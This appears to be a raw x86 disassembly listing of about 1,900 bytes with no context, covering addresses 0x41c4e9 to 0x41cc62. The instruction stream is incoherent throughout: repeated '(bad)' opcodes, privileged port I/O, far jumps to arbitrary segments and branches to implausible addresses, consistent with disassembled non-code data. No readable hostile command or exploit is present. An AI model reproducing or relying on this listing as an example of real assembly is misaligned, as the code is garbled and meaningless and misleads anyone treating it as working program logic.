  41c4e9:	ins    DWORD PTR es:[edi],dx
  41c4ea:	sar    eax,0xfd
  41c4ed:	aaa    
  41c4ee:	out    dx,eax
  41c4ef:	sub    edx,DWORD PTR ds:0xb4733184
  41c4f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4f6:	ret    0xf194
  41c4f9:	stos   DWORD PTR es:[edi],eax
  41c4fa:	ror    DWORD PTR [ecx-0x60],1
  41c4fd:	adc    al,0xd8
  41c4ff:	call   0x8e4a8f68
  41c504:	ror    edx,cl
  41c506:	popf   
  41c507:	ret    0xe274
  41c50a:	test   eax,0xa0d7c68c
  41c50f:	sub    al,0xbd
  41c511:	dec    ebp
  41c512:	pop    ecx
  41c513:	xchg   edi,eax
  41c514:	mov    esi,0x8aec7ae1
  41c519:	into   
  41c51a:	cmp    al,0xd5
  41c51c:	add    DWORD PTR [ecx+0x4d],ecx
  41c51f:	and    BYTE PTR [eax-0x5f],al
  41c522:	xor    BYTE PTR [ecx+ebp*2],0xba
  41c526:	out    dx,eax
  41c527:	shl    DWORD PTR [ecx],cl
  41c529:	pop    edi
  41c52a:	or     esp,ecx
  41c52c:	sub    DWORD PTR [esi+0x4d],esp
  41c52f:	fwait
  41c530:	dec    edx
  41c531:	jge    0x41c586
  41c533:	dec    esp
  41c534:	mov    cl,0xef
  41c536:	cmp    BYTE PTR [eax-0x73091a79],ah
  41c53c:	and    esp,DWORD PTR ds:0x3417c911
  41c542:	or     DWORD PTR es:[ecx-0x2b71280b],0xffffffde
  41c54a:	add    al,0xf5
  41c54c:	xchg   ebx,eax
  41c54d:	pop    edi
  41c54e:	and    ebx,DWORD PTR [eax]
  41c550:	push   ecx
  41c551:	sub    eax,0x4c267fd
  41c556:	xor    ah,BYTE PTR [esi]
  41c558:	jb     0x41c507
  41c55a:	adc    dl,BYTE PTR [edx-0x36]
  41c55d:	xchg   esi,eax
  41c55e:	mov    edi,ebx
  41c560:	pop    ebx
  41c561:	test   edx,0xa702ce2f
  41c567:	inc    edx
  41c568:	xor    DWORD PTR [ebx+ebx*1+0x33],esp
  41c56c:	jl     0x41c543
  41c56e:	or     al,0x4e
  41c570:	or     al,dl
  41c572:	xlat   BYTE PTR ds:[ebx]
  41c573:	rol    ebp,0xa2
  41c576:	jmp    0x9bf853c3
  41c57b:	out    0x4f,eax
  41c57d:	(bad)  
  41c57e:	mov    bl,0x4f
  41c580:	jle    0x41c511
  41c582:	mov    esi,0xbf3e2aff
  41c587:	out    0x2d,al
  41c589:	stos   DWORD PTR es:[edi],eax
  41c58a:	outs   dx,BYTE PTR ds:[esi]
  41c58b:	mov    eax,0x11
  41c590:	add    BYTE PTR [eax],al
  41c592:	in     eax,0x12
  41c594:	pop    es
  41c595:	dec    ebx
  41c596:	neg    DWORD PTR [edi-0x13]
  41c599:	mov    esi,0xd2d3b943
  41c59e:	iret   
  41c59f:	jmp    0x419d0a50
  41c5a4:	add    DWORD PTR [eax],eax
  41c5a6:	repz add al,0x0
  41c5a9:	add    cl,bl
  41c5ab:	push   ebp
  41c5ac:	stos   BYTE PTR es:[edi],al
  41c5ad:	pop    ebx
  41c5ae:	ret    
  41c5af:	jecxz  0x41c57d
  41c5b1:	shl    dl,cl
  41c5b3:	push   ss
  41c5b4:	mov    ah,0xce
  41c5b6:	jb     0x41c632
  41c5b8:	dec    esi
  41c5b9:	int    0x70
  41c5bb:	imul   ebp,DWORD PTR [edi-0x69a2555b],0xffffff97
  41c5c2:	leave  
  41c5c3:	js     0xf2ee36a8
  41c5c9:	in     eax,0x4f
  41c5cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5cc:	cdq    
  41c5cd:	or     BYTE PTR fs:[ebx],ch
  41c5d0:	jmp    0x37ab:0x28519d60
  41c5d7:	scas   al,BYTE PTR es:[edi]
  41c5d8:	lods   al,BYTE PTR ds:[esi]
  41c5d9:	pop    ebx
  41c5da:	ja     0x41c596
  41c5dc:	xlat   BYTE PTR ds:[ebx]
  41c5dd:	arpl   WORD PTR [edx+ecx*8-0x3b35527f],dx
  41c5e4:	xlat   BYTE PTR ds:[ebx]
  41c5e5:	cdq    
  41c5e6:	adc    eax,esp
  41c5e8:	pop    esi
  41c5e9:	add    ebp,DWORD PTR [eax-0x56]
  41c5ec:	or     DWORD PTR [ebx-0x643ede83],ecx
  41c5f2:	nop
  41c5f3:	ret    0xa64
  41c5f6:	push   esi
  41c5f7:	push   eax
  41c5f8:	and    ecx,DWORD PTR [edi+ecx*1]
  41c5fb:	cmp    ch,BYTE PTR [edi]
  41c5fd:	adc    esi,DWORD PTR [esi]
  41c5ff:	loope  0x41c5ab
  41c601:	and    al,0x34
  41c604:	inc    edx
  41c605:	icebp  
  41c606:	ret    0xff7e
  41c609:	xchg   esi,eax
  41c60a:	ret    0x57e5
  41c60d:	out    dx,al
  41c60e:	or     DWORD PTR ds:0xc49a28a7,edi
  41c614:	out    0xda,al
  41c616:	mov    eax,ds:0xcead481c
  41c61b:	mov    bl,0xac
  41c61d:	popf   
  41c61e:	shl    DWORD PTR [ebx+0x34],0x91
  41c622:	add    al,0xb0
  41c624:	or     al,0x13
  41c626:	mov    esp,0xa23dd79c
  41c62b:	xor    eax,0xd2b130ff
  41c630:	mov    ebx,0x18037e9b
  41c635:	das    
  41c636:	xor    BYTE PTR [ebp+0x6d],bl
  41c639:	or     DWORD PTR [edx-0x7b],0x7ca35f4f
  41c640:	sbb    dl,cl
  41c642:	les    ecx,FWORD PTR [ecx]
  41c644:	cdq    
  41c645:	push   ss
  41c646:	push   ss
  41c647:	mov    ah,0x32
  41c649:	std    
  41c64a:	iret   
  41c64b:	push   edx
  41c64c:	fnstenv [eax-0x43ba8148]
  41c652:	push   es
  41c653:	scas   eax,DWORD PTR es:[edi]
  41c654:	sar    BYTE PTR [edx+eax*8+0xfe676d],cl
  41c65b:	repnz dec edx
  41c65d:	xchg   BYTE PTR [esi],ah
  41c65f:	stos   BYTE PTR es:[edi],al
  41c660:	jge    0x41c5e9
  41c662:	mov    edi,DWORD PTR [ebp-0x79]
  41c665:	mov    ch,0xa2
  41c667:	dec    esi
  41c668:	cwde   
  41c669:	test   eax,0x4ee0c6c7
  41c66e:	enter  0xea8e,0x24
  41c672:	test   BYTE PTR [eax],dh
  41c674:	dec    edx
  41c675:	cmc    
  41c676:	mov    ch,0xae
  41c678:	in     eax,0x19
  41c67a:	mov    ecx,0x12da69fc
  41c67f:	imul   edx,DWORD PTR [eax],0x21
  41c682:	push   cs
  41c683:	jmp    0xf79dfd0e
  41c688:	retf   
  41c689:	add    DWORD PTR ds:0xb18c553,0x75f9dc75
  41c693:	arpl   WORD PTR [edx-0xd],sp
  41c696:	inc    ebp
  41c697:	cli    
  41c698:	mov    al,ds:0xed17fbce
  41c69d:	stos   BYTE PTR es:[edi],al
  41c69e:	pop    eax
  41c69f:	mov    esi,0xdf5a9acc
  41c6a4:	ins    DWORD PTR es:[edi],dx
  41c6a5:	push   ebp
  41c6a6:	jle    0x41c69e
  41c6a8:	gs loop 0x41c633
  41c6ab:	test   DWORD PTR [edi-0x34f93532],edx
  41c6b1:	mov    bh,0xe1
  41c6b3:	or     BYTE PTR [ebx],dl
  41c6b5:	xor    dl,cl
  41c6b7:	sub    DWORD PTR [esi],edx
  41c6b9:	(bad)  
  41c6bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6bc:	mov    edi,0x7dc8ac39
  41c6c1:	adc    eax,0xb88060dd
  41c6c6:	adc    eax,DWORD PTR [edx-0x9]
  41c6c9:	jno    0x41c70b
  41c6cb:	rcr    ecx,cl
  41c6cd:	jo     0x41c6bb
  41c6cf:	cwde   
  41c6d0:	mov    ds:0xfe119fa5,al
  41c6d5:	test   al,0x48
  41c6d7:	xchg   ecx,eax
  41c6d8:	clc    
  41c6d9:	inc    esp
  41c6da:	adc    al,0x2b
  41c6dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6dd:	or     DWORD PTR [eax+0x3ce63b6f],ebx
  41c6e3:	add    DWORD PTR [eax],0x9c989101
  41c6e9:	data16 sub bl,BYTE PTR [eax-0x8504662]
  41c6f0:	out    dx,al
  41c6f1:	js     0x41c6fe
  41c6f3:	jmp    0x41c6d6
  41c6f5:	or     BYTE PTR [esi+eax*2],0x9b
  41c6f9:	inc    ecx
  41c6fa:	and    al,0x1
  41c6fc:	pop    ss
  41c6fd:	sbb    al,0x4a
  41c6ff:	test   bh,bh
  41c701:	imul   esi,DWORD PTR [eax-0x43249cfa],0x81e13d0
  41c70b:	daa    
  41c70c:	rol    DWORD PTR [edi*4-0x95866e6],0xf0
  41c714:	and    BYTE PTR [esi-0x431ddc92],bl
  41c71a:	(bad)  
  41c71c:	cmp    cl,BYTE PTR [ecx]
  41c71e:	and    ecx,DWORD PTR [ecx-0x5c4e997b]
  41c724:	rcr    BYTE PTR [ecx+0x3306d9fa],0xbe
  41c72b:	fsub   st,st(3)
  41c72d:	stc    
  41c72e:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c730:	into   
  41c731:	clc    
  41c732:	cli    
  41c733:	add    cl,BYTE PTR [ebx+0x56bba71e]
  41c739:	cdq    
  41c73a:	jne    0x41c760
  41c73c:	lods   eax,DWORD PTR ds:[esi]
  41c73d:	(bad)  
  41c73e:	xchg   edx,eax
  41c73f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c740:	cwde   
  41c741:	imul   BYTE PTR [ecx-0x2b]
  41c744:	mov    ah,0xe0
  41c746:	ins    DWORD PTR es:[edi],dx
  41c747:	jl     0x41c79d
  41c749:	mov    al,0xc3
  41c74b:	add    esi,edx
  41c74d:	add    al,0x62
  41c74f:	jo     0x41c7bb
  41c751:	and    al,0x2d
  41c753:	sbb    eax,0x3453ae90
  41c758:	add    dh,ah
  41c75a:	add    DWORD PTR [eax-0x2c436687],0x14
  41c761:	xchg   esi,eax
  41c762:	outs   dx,BYTE PTR ds:[esi]
  41c763:	loop   0x41c7a6
  41c765:	jns    0x41c6f0
  41c767:	pop    ss
  41c768:	xchg   edi,eax
  41c769:	(bad)  
  41c76a:	adc    esp,DWORD PTR [ebp+edx*4+0xe60a89c]
  41c771:	dec    edi
  41c772:	push   esp
  41c773:	inc    eax
  41c774:	fs in  al,0xed
  41c777:	push   edi
  41c778:	jo     0x41c72b
  41c77a:	inc    eax
  41c77b:	and    ch,BYTE PTR [eax+0x18]
  41c77e:	in     eax,0x5c
  41c780:	mov    eax,ds:0xb6f3a7e9
  41c785:	out    dx,eax
  41c786:	repz jns 0x41c7f1
  41c789:	in     eax,dx
  41c78a:	mul    DWORD PTR ss:[esi+eiz*2]
  41c78e:	xor    eax,0x9ec42eb0
  41c793:	push   ds
  41c794:	shl    edx,1
  41c796:	fisub  DWORD PTR [eax+ebp*8]
  41c799:	or     eax,DWORD PTR [ebx-0x6a]
  41c79c:	pop    ebp
  41c79d:	dec    ebx
  41c79e:	add    DWORD PTR [ecx+ecx*2-0x6],0x1e5cbc63
  41c7a6:	(bad)  
  41c7a7:	jl     0x41c7e0
  41c7a9:	scas   al,BYTE PTR es:[edi]
  41c7aa:	scas   eax,DWORD PTR es:[edi]
  41c7ab:	mov    ah,0x66
  41c7ad:	mov    esp,0x48336ce5
  41c7b2:	mov    esp,0x52c2ddab
  41c7b7:	jmp    0x41c74c
  41c7b9:	mov    ebp,0x65908902
  41c7be:	mov    ebp,0x2fb5a475
  41c7c3:	fs dec edx
  41c7c5:	adc    DWORD PTR ds:0xa1dc7d40,0xfffffff1
  41c7cc:	pop    eax
  41c7cd:	sbb    eax,0x69897270
  41c7d2:	inc    ecx
  41c7d3:	mov    WORD PTR [ebp-0x27],gs
  41c7d6:	mov    ds:0xd4a4d112,eax
  41c7db:	xchg   esi,eax
  41c7dc:	sbb    DWORD PTR [eax-0x3826001c],esp
  41c7e2:	fist   DWORD PTR [edx]
  41c7e4:	loope  0x41c837
  41c7e6:	stos   BYTE PTR es:[edi],al
  41c7e7:	cmp    eax,0xabba3dfe
  41c7ec:	or     edx,ebp
  41c7ee:	sbb    BYTE PTR [eax+0x47b2945a],bh
  41c7f4:	shl    DWORD PTR [ebx+0x6e],1
  41c7f7:	stos   BYTE PTR es:[edi],al
  41c7f8:	pop    ecx
  41c7f9:	cmp    eax,0x561039d7
  41c7fe:	les    edi,FWORD PTR [ecx+0x35]
  41c801:	mov    edi,0x11f635fa
  41c806:	les    esi,FWORD PTR [edx-0x437fbebe]
  41c80c:	aaa    
  41c80d:	pop    esp
  41c80e:	aam    0x45
  41c810:	retf   0xe287
  41c813:	jbe    0x41c80a
  41c815:	jns    0x41c808
  41c817:	and    ebx,ecx
  41c819:	loop   0x41c7b6
  41c81b:	js     0x41c818
  41c81d:	(bad)  
  41c81e:	mov    ah,BYTE PTR [edx-0x3d21fc08]
  41c824:	and    DWORD PTR [esi-0x230482f8],ebx
  41c82a:	clc    
  41c82b:	int3   
  41c82c:	jb     0x41c7b4
  41c82e:	sub    dh,bh
  41c830:	mov    edx,0x3e8c0b1e
  41c835:	and    eax,0xe2519be2
  41c83a:	add    eax,0xd9fa4c06
  41c83f:	cmp    dl,BYTE PTR ds:0x3aaa1ef6
  41c845:	push   edx
  41c846:	push   eax
  41c847:	sbb    eax,0xedd4565b
  41c84c:	and    ecx,DWORD PTR [edx+0x40]
  41c84f:	dec    edx
  41c850:	dec    esi
  41c851:	scas   al,BYTE PTR es:[edi]
  41c852:	addr16 jge 0x41c893
  41c855:	push   edi
  41c856:	sub    eax,0xdafe3bba
  41c85b:	sub    ecx,edx
  41c85d:	das    
  41c85e:	or     BYTE PTR [esi+0x26],dh
  41c861:	loope  0x41c83f
  41c863:	jg     0x41c809
  41c865:	cmp    al,0xa2
  41c867:	and    eax,0xefe320a4
  41c86c:	mov    eax,0x1654cb0b
  41c871:	fsubp  st(4),st
  41c873:	aad    0xad
  41c875:	lahf   
  41c876:	fld    TBYTE PTR [ebp-0x51]
  41c879:	mov    al,ds:0x900cf46a
  41c87e:	mov    gs,WORD PTR [ecx-0x4f]
  41c881:	fwait
  41c882:	sub    ecx,esi
  41c884:	mov    esp,eax
  41c886:	(bad)  
  41c888:	mov    ecx,0xc59b1152
  41c88d:	sub    eax,0xdb051103
  41c892:	xor    ch,ch
  41c894:	das    
  41c895:	test   eax,0x54b451e0
  41c89a:	test   al,0x28
  41c89c:	jno    0x41c835
  41c89e:	stc    
  41c89f:	adc    BYTE PTR [eax+0xa],al
  41c8a2:	mov    WORD PTR [ebx],gs
  41c8a4:	inc    ecx
  41c8a5:	add    dh,dl
  41c8a7:	mov    esi,0xfc283817
  41c8ac:	inc    edx
  41c8ad:	push   esp
  41c8ae:	or     eax,DWORD PTR [ebx]
  41c8b0:	jge    0x41c90c
  41c8b2:	cmp    eax,0x410b31dc
  41c8b7:	pop    esp
  41c8b8:	je     0x41c918
  41c8ba:	mov    esi,0x4100e017
  41c8bf:	xor    BYTE PTR [ebx-0x34c00b52],al
  41c8c5:	mulps  xmm1,XMMWORD PTR [ecx-0x67398697]
  41c8cc:	icebp  
  41c8cd:	call   0x2d7a:0x829134ed
  41c8d4:	xor    al,0x8
  41c8d6:	pop    edi
  41c8d7:	pop    edi
  41c8d8:	cmp    BYTE PTR [eax],bl
  41c8da:	mov    ecx,0x52807c56
  41c8df:	push   cs
  41c8e0:	dec    eax
  41c8e1:	jbe    0x41c8b8
  41c8e3:	push   ss
  41c8e4:	or     al,0x85
  41c8e6:	int    0x23
  41c8e8:	pop    esi
  41c8e9:	int3   
  41c8ea:	imul   esi,DWORD PTR [eax+0x6fc16546],0xffffffa3
  41c8f1:	dec    esi
  41c8f2:	mov    edx,0xeb6b476f
  41c8f7:	sahf   
  41c8f8:	out    dx,eax
  41c8f9:	cmp    BYTE PTR [edi+ebx*4],0x91
  41c8fd:	add    bl,BYTE PTR [ebp-0x5f19379c]
  41c903:	pop    ss
  41c904:	mov    BYTE PTR [edi],ah
  41c906:	mov    bh,0xf0
  41c908:	add    bl,BYTE PTR [ebp+esi*4+0x9609a36]
  41c90f:	cmp    al,0x92
  41c911:	test   BYTE PTR gs:[esi],dl
  41c914:	or     BYTE PTR [edi-0x73],bl
  41c917:	fadd   st,st(5)
  41c919:	(bad)  
  41c91a:	in     al,dx
  41c91b:	out    0x1b,al
  41c91d:	in     eax,dx
  41c91e:	inc    BYTE PTR [ebx]
  41c920:	push   DWORD PTR [eax+0x4819555d]
  41c926:	das    
  41c927:	adc    dh,BYTE PTR [edx+0x1f]
  41c92a:	mov    dl,0xea
  41c92c:	and    DWORD PTR [eax],ebx
  41c92e:	je     0x41c96d
  41c930:	jp     0x41c8c0
  41c932:	push   0x391bf031
  41c937:	pop    ebp
  41c938:	inc    eax
  41c939:	ficom  WORD PTR [esi]
  41c93b:	cmp    esi,DWORD PTR [ebx-0x4a1e7ac4]
  41c941:	sub    DWORD PTR [ebx+ecx*4+0x57f2342b],edi
  41c948:	jp     0x41c957
  41c94a:	test   eax,0x5111364f
  41c94f:	das    
  41c950:	mov    ch,0x84
  41c952:	ja     0x41c986
  41c954:	xor    DWORD PTR [ebx-0x30afff03],esp
  41c95a:	mov    ds:0xab186d8c,eax
  41c95f:	or     DWORD PTR [ebx],esi
  41c961:	test   al,0x89
  41c963:	sti    
  41c964:	xchg   ebp,eax
  41c965:	outs   dx,DWORD PTR ds:[esi]
  41c966:	retf   0xcff0
  41c969:	add    esi,edx
  41c96b:	(bad)  
  41c96c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c96d:	rcr    BYTE PTR [ebp+ebx*2-0x36463f9a],cl
  41c974:	lods   al,BYTE PTR ds:[esi]
  41c975:	cmp    al,0xbd
  41c977:	xlat   BYTE PTR ds:[ebx]
  41c978:	jns    0x41c951
  41c97a:	das    
  41c97b:	pop    es
  41c97c:	pushf  
  41c97d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c97e:	imul   edx,DWORD PTR [ecx-0x2c],0xffffffa9
  41c982:	inc    eax
  41c983:	cmp    al,0xf9
  41c985:	je     0x41c990
  41c987:	and    BYTE PTR [ebx-0x3a20477e],dh
  41c98d:	xor    dl,bh
  41c98f:	aad    0xa1
  41c991:	sub    al,0xce
  41c993:	sbb    edi,DWORD PTR [edx]
  41c995:	and    eax,0xc827a5d0
  41c99a:	test   DWORD PTR [ebx+0xb45910],eax
  41c9a0:	cmp    edx,esi
  41c9a2:	jg     0x41c9f3
  41c9a4:	shl    DWORD PTR [edx+0x46792915],1
  41c9aa:	push   edx
  41c9ab:	ds test dh,al
  41c9ae:	pop    ds
  41c9af:	xor    al,0x28
  41c9b1:	xchg   edx,eax
  41c9b2:	xchg   esi,eax
  41c9b3:	mov    ebx,0x88ced8b5
  41c9b8:	popa   
  41c9b9:	aas    
  41c9ba:	xor    DWORD PTR [edi-0x34],0x96bdb8cd
  41c9c1:	fwait
  41c9c2:	shr    ah,cl
  41c9c4:	jge    0x41c9ef
  41c9c6:	pop    ecx
  41c9c7:	mov    eax,ds:0x643a70bc
  41c9cc:	xchg   ebp,eax
  41c9cd:	push   es
  41c9ce:	dec    ebx
  41c9cf:	sahf   
  41c9d0:	cmc    
  41c9d1:	xchg   edi,eax
  41c9d2:	out    0x93,al
  41c9d4:	mov    eax,0x8e031d98
  41c9d9:	mov    DWORD PTR [eax],edx
  41c9db:	pushf  
  41c9dc:	xor    DWORD PTR [ebp+0x21ffc788],edx
  41c9e2:	jl     0x41ca3c
  41c9e4:	sub    BYTE PTR [ebp+0x4f91a150],0xb7
  41c9eb:	mov    ecx,0xff7e9192
  41c9f0:	mov    ebx,DWORD PTR [esi+0x69c4e123]
  41c9f6:	fbld   TBYTE PTR [edi+edx*8]
  41c9f9:	push   cs
  41c9fa:	jns    0x41ca28
  41c9fc:	xchg   esp,eax
  41c9fd:	icebp  
  41c9fe:	rcl    bh,0xbf
  41ca01:	test   al,0xc3
  41ca03:	mov    esp,0x798c5ea4
  41ca08:	ffreep st(3)
  41ca0a:	jmp    0x5aae:0x94cd6ee3
  41ca11:	xor    eax,0x41022bb0
  41ca16:	repnz les edx,FWORD PTR [edi]
  41ca19:	cwde   
  41ca1a:	test   eax,0x73c6c662
  41ca1f:	push   0x7037b93
  41ca24:	and    eax,0xc7990e5
  41ca29:	sub    esi,DWORD PTR fs:[edx-0x7be66a1a]
  41ca30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca31:	outs   dx,DWORD PTR ds:[esi]
  41ca32:	sbb    DWORD PTR [edx-0x428c99a2],esp
  41ca38:	jge    0x41ca27
  41ca3a:	lds    edx,FWORD PTR [eax]
  41ca3c:	int    0xa6
  41ca3e:	aam    0x79
  41ca40:	loope  0x41c9d8
  41ca42:	out    dx,al
  41ca43:	js     0x41cab3
  41ca45:	mov    esi,0x8a32636f
  41ca4a:	imul   eax,DWORD PTR [edx+ebx*4+0x9cdea41],0xffffffa5
  41ca52:	loop   0x41c9f5
  41ca54:	cmp    esi,eax
  41ca56:	rcl    BYTE PTR [eax+0x7fd2d2eb],0x3
  41ca5d:	mov    bh,0xf8
  41ca5f:	sbb    al,0x1e
  41ca61:	xchg   edi,eax
  41ca62:	xlat   BYTE PTR ds:[ebx]
  41ca63:	mov    al,0x2f
  41ca65:	inc    ecx
  41ca66:	and    eax,0x9f73aa30
  41ca6b:	push   ds
  41ca6c:	jge    0x41ca89
  41ca6e:	sub    DWORD PTR [ecx+0x5a90ccd5],ebp
  41ca74:	ss mov bh,0x54
  41ca77:	pop    ss
  41ca78:	cmp    eax,DWORD PTR [ebp+ebx*8+0x75]
  41ca7c:	pop    ebx
  41ca7d:	sbb    eax,0x693fbc42
  41ca82:	pop    edx
  41ca83:	repz jno 0x41ca5d
  41ca86:	mov    edi,0x85dd0ff2
  41ca8b:	cmp    al,0xd4
  41ca8d:	lods   eax,DWORD PTR ds:[esi]
  41ca8e:	punpcklbw mm3,DWORD PTR [esi+0x44257783]
  41ca95:	or     dh,bh
  41ca97:	jbe    0x41ca2a
  41ca99:	or     al,0x1e
  41ca9b:	push   cs
  41ca9c:	jno    0x41ca9e
  41ca9e:	add    BYTE PTR [eax],al
  41caa0:	add    BYTE PTR [eax],al
  41caa2:	in     al,0x3e
  41caa4:	mov    esp,ss
  41caa6:	fdivrp st(6),st
  41caa8:	cld    
  41caa9:	ds push esp
  41caab:	daa    
  41caac:	cmp    esi,DWORD PTR [edx-0x5a]
  41caaf:	push   ds
  41cab0:	(bad)  
  41cab1:	fisttp WORD PTR [esi+0x46]
  41cab4:	add    DWORD PTR [eax],eax
  41cab6:	repz add al,0x0
  41cab9:	add    BYTE PTR [eax+0x7f],dl
  41cabc:	and    bh,BYTE PTR [ebp-0x3d]
  41cabf:	push   ebx
  41cac0:	test   al,0xb5
  41cac2:	aad    0x2e
  41cac4:	pop    ss
  41cac5:	cmp    eax,0x5fca8e00
  41caca:	sar    ebx,1
  41cacc:	bound  ebp,QWORD PTR [ebx]
  41cace:	add    al,0x1c
  41cad0:	mov    ah,0x53
  41cad2:	lahf   
  41cad3:	lea    ecx,[edi+0x18]
  41cad6:	pop    ebp
  41cad7:	xor    al,BYTE PTR ds:0x65578612
  41cadd:	fsubp  st(7),st
  41cadf:	jno    0x41caef
  41cae1:	jl     0x41cae8
  41cae3:	mov    esp,DWORD PTR [ebp+eax*1+0xd976ad6]
  41caea:	mov    bh,0x4b
  41caec:	fwait
  41caed:	daa    
  41caee:	(bad)  
  41caef:	mov    eax,0x99b42e04
  41caf4:	sub    esp,edx
  41caf6:	retf   0x5b4a
  41caf9:	inc    edi
  41cafa:	jle    0x41cad2
  41cafc:	jb     0x41cb47
  41cafe:	outs   dx,DWORD PTR ds:[esi]
  41caff:	adc    esi,DWORD PTR [edx+ebp*2+0x12]
  41cb03:	mov    al,0xbd
  41cb05:	pop    edi
  41cb06:	cmp    esp,esi
  41cb08:	jge    0x41cb5d
  41cb0a:	adc    dl,dh
  41cb0c:	cmp    BYTE PTR [ebp-0x41f21283],0xfc
  41cb13:	das    
  41cb14:	jae    0x41cabd
  41cb16:	fnstcw WORD PTR [edx]
  41cb18:	pop    ebx
  41cb19:	in     al,0x9e
  41cb1b:	mov    ds:0x150c6f9e,al
  41cb20:	cmp    ebx,esi
  41cb22:	mov    ds:0x7ed8cd1f,al
  41cb27:	jge    0x41cb95
  41cb29:	(bad)  
  41cb2a:	or     ah,dh
  41cb2c:	in     al,dx
  41cb2d:	cmp    BYTE PTR [eax+0x54],dh
  41cb30:	and    eax,0xdbf85ef9
  41cb35:	shl    BYTE PTR [edi],cl
  41cb37:	mov    eax,0x886af7ac
  41cb3c:	and    dl,cl
  41cb3e:	std    
  41cb3f:	inc    ebp
  41cb40:	fwait
  41cb41:	jno    0x41cb1b
  41cb43:	(bad)  
  41cb44:	push   ss
  41cb45:	(bad)  
  41cb47:	ins    BYTE PTR es:[edi],dx
  41cb48:	adc    al,0x37
  41cb4a:	in     al,dx
  41cb4b:	stos   DWORD PTR es:[edi],eax
  41cb4c:	ja     0x41cb45
  41cb4e:	retf   
  41cb4f:	inc    esp
  41cb50:	aaa    
  41cb51:	popf   
  41cb52:	inc    edi
  41cb53:	mov    ebx,DWORD PTR [eax+ebx*1-0x53]
  41cb57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb58:	sahf   
  41cb59:	jge    0x41cb71
  41cb5b:	sub    eax,eax
  41cb5d:	or     BYTE PTR [ecx+0x277c976a],bl
  41cb63:	inc    esp
  41cb64:	mov    dl,0x3c
  41cb66:	pop    esp
  41cb67:	ret    0x96b0
  41cb6a:	pop    edi
  41cb6b:	inc    ebp
  41cb6c:	add    BYTE PTR [ebx-0x3f0c410d],bh
  41cb72:	out    0x28,eax
  41cb74:	cmp    dh,BYTE PTR [eax]
  41cb76:	fcom   QWORD PTR [esi-0x41]
  41cb79:	mov    eax,ds:0xb55eacba
  41cb7e:	add    ebp,edx
  41cb80:	dec    ecx
  41cb81:	pop    es
  41cb82:	in     al,0x9c
  41cb84:	pushf  
  41cb85:	cli    
  41cb86:	fadd   QWORD PTR [edi-0x62]
  41cb89:	in     eax,0x39
  41cb8b:	or     ecx,esp
  41cb8d:	dec    esp
  41cb8e:	mov    ah,0x9d
  41cb90:	dec    esp
  41cb91:	push   ds
  41cb92:	std    
  41cb93:	pop    ebx
  41cb94:	(bad)  
  41cb96:	aaa    
  41cb97:	add    esi,ebx
  41cb99:	mov    ecx,0xdf6d483e
  41cb9e:	push   cs
  41cb9f:	stc    
  41cba0:	(bad)  
  41cba2:	pusha  
  41cba3:	stos   BYTE PTR es:[edi],al
  41cba4:	xchg   ebx,eax
  41cba5:	cmp    BYTE PTR [edx-0x80],dl
  41cba8:	imul   esi,DWORD PTR [ebp+0x12],0xffffffa5
  41cbac:	bsf    ecx,DWORD PTR [ebx+0x50]
  41cbb0:	cld    
  41cbb1:	fldenv [esi+0x2e]
  41cbb4:	fadd   QWORD PTR [ecx+0x61]
  41cbb7:	mov    bl,0xd
  41cbb9:	jmp    0xbeaa9890
  41cbbe:	and    dl,al
  41cbc0:	and    eax,0xba63cebb
  41cbc5:	or     ch,dl
  41cbc7:	mov    ah,0x3c
  41cbc9:	std    
  41cbca:	sbb    ebx,DWORD PTR [eax-0x4]
  41cbcd:	gs mov edx,0xf7584c32
  41cbd3:	mov    dl,0xd
  41cbd5:	adc    BYTE PTR [esi+0x4d],bl
  41cbd8:	sub    al,0x1a
  41cbda:	jno    0x41cbee
  41cbdc:	adc    ebx,DWORD PTR [edi]
  41cbde:	das    
  41cbdf:	sub    ch,BYTE PTR [edx+0x2ed93e45]
  41cbe5:	push   edi
  41cbe6:	inc    ebp
  41cbe7:	test   DWORD PTR [edx+0x4c13ab88],ebp
  41cbed:	and    ebx,esi
  41cbef:	jno    0x41cb71
  41cbf1:	lahf   
  41cbf2:	mov    bh,0xc7
  41cbf4:	shl    ecx,0x55
  41cbf7:	mov    edx,0x99d11b31
  41cbfc:	cmc    
  41cbfd:	dec    esi
  41cbfe:	cmc    
  41cbff:	xor    eax,0xdc15abb2
  41cc04:	cli    
  41cc05:	outs   dx,BYTE PTR ds:[esi]
  41cc06:	fist   DWORD PTR [ebp-0x58]
  41cc09:	jp     0x41cc4f
  41cc0b:	sbb    al,0xdb
  41cc0d:	stos   BYTE PTR es:[edi],al
  41cc0e:	fdivr  QWORD PTR [esi]
  41cc10:	test   al,cl
  41cc12:	rol    ebx,1
  41cc14:	aaa    
  41cc15:	jecxz  0x41cc06
  41cc17:	popa   
  41cc18:	inc    ebx
  41cc19:	mov    ds:0xc817502e,al
  41cc1e:	lahf   
  41cc1f:	rol    DWORD PTR [eax],0xec
  41cc22:	and    DWORD PTR [esi+ebx*2],ebp
  41cc25:	sub    BYTE PTR [ebx+edi*4-0x6c],0x86
  41cc2a:	pop    ebp
  41cc2b:	cmp    al,0x7e
  41cc2d:	xchg   BYTE PTR [eax+ebp*4-0x4c],cl
  41cc31:	les    ebp,FWORD PTR [edx]
  41cc33:	les    edx,FWORD PTR [esi]
  41cc35:	push   ss
  41cc36:	mov    edi,0x51ce05c6
  41cc3b:	cmp    eax,edi
  41cc3d:	into   
  41cc3e:	rcl    DWORD PTR [eax-0x309ef163],1
  41cc44:	xor    dl,BYTE PTR ds:0xbeacb640
  41cc4a:	stos   DWORD PTR es:[edi],eax
  41cc4b:	rcl    BYTE PTR [esi+0x4],0x22
  41cc4f:	jmp    0xdc62:0x7c814eef
  41cc56:	inc    esp
  41cc57:	or     DWORD PTR [edx+edi*1],edx
  41cc5a:	(bad)  
  41cc5b:	das    
  41cc5c:	adc    DWORD PTR [edx-0x703061be],esp
  41cc62:	push   0x6b1bc46a
